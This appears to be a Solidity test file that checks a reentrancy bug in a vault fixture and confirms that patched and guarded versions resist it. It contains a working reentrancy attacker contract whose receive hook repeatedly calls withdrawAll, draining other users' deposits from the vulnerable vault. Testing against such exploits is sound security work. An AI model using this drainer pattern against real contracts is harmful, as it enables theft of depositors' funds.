// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {TestBase} from "./TestBase.sol";
import {EtherVault} from "fixtures/02-reentrancy-drain/src/EtherVault.sol";
import {EtherVault as PatchedVault} from "fixtures/02-reentrancy-drain-patched/src/EtherVault.sol";
import {EtherVault as GuardedVault} from "fixtures/03-reentrancy-guarded/src/EtherVault.sol";

interface IVault {
    function deposit() external payable;
    function withdrawAll() external;
}

contract Reenterer {
    IVault internal immutable vault;

    constructor(IVault vault_) {
        vault = vault_;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdrawAll();
    }

    receive() external payable {
        if (address(vault).balance >= msg.value && msg.value > 0) vault.withdrawAll();
    }
}

contract ReentrancyDrainTest is TestBase {
    function _fund(address vault) internal {
        for (uint160 i = 1; i <= 9; i++) {
            address user = address(0x1000 + i);
            vm.deal(user, 1 ether);
            vm.prank(user);
            IVault(vault).deposit{value: 1 ether}();
        }
    }

    function test_vulnerable_reentrancyDrainsOtherDepositors() public {
        EtherVault vault = new EtherVault();
        _fund(address(vault));
        Reenterer attacker = new Reenterer(IVault(address(vault)));
        vm.deal(address(this), 1 ether);
        attacker.attack{value: 1 ether}();
        assertEq(address(vault).balance, 0, "vault drained");
        assertEq(address(attacker).balance, 10 ether, "attacker took 9 ether of other deposits");
    }

    function test_patched_reentrantWithdrawReverts() public {
        PatchedVault vault = new PatchedVault();
        _fund(address(vault));
        Reenterer attacker = new Reenterer(IVault(address(vault)));
        vm.deal(address(this), 1 ether);
        vm.expectRevert(bytes("send failed"));
        attacker.attack{value: 1 ether}();
        assertEq(address(vault).balance, 9 ether, "deposits intact");
    }

    function test_guarded_reentrantWithdrawReverts() public {
        GuardedVault vault = new GuardedVault();
        _fund(address(vault));
        Reenterer attacker = new Reenterer(IVault(address(vault)));
        vm.deal(address(this), 1 ether);
        vm.expectRevert(bytes("send failed"));
        attacker.attack{value: 1 ether}();
        assertEq(address(vault).balance, 9 ether, "deposits intact");
    }
}
